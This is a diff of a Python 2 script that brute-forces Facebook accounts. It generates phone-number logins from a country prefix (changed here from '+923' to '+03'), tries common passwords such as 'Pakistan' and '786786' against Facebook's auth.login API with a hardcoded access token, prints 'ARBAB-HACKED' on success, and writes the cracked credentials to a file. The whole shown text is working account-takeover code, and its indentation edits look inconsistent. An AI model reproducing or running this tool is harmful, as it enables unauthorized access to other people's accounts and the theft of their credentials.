@@ -107,7 +107,7 @@ def action():
 		print "\033[1;95m05, 06, 07, 08, 09,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+03"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -123,7 +123,7 @@ def action():
 		print "\033[1;95m45, 64, ??, ??, ??,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+03"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -139,7 +139,7 @@ def action():
 		print "\033[1;95m24, ??, ??, ??,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+03"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -155,7 +155,7 @@ def action():
 		print "\033[1;95m35, 36, 37, ??,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+03"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -171,7 +171,7 @@ def action():
 		print "\033[1;95m14, 15, 16, 17,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+03"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -239,9 +239,9 @@ def action():
 				else:	
 					pass2 = 'Pakistan'
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-			    q = json.load(data)
+			                q = json.load(data)
 					if 'access_token' in q:
-		        print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
+		                        print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
@@ -256,7 +256,7 @@ def action():
 						else:	
 							pass3 = '786786'
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-			        q = json.load(data)
+			                                q = json.load(data)
 							if 'access_token' in q:
 								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
 								okb = open('save/successfull.txt', 'a')
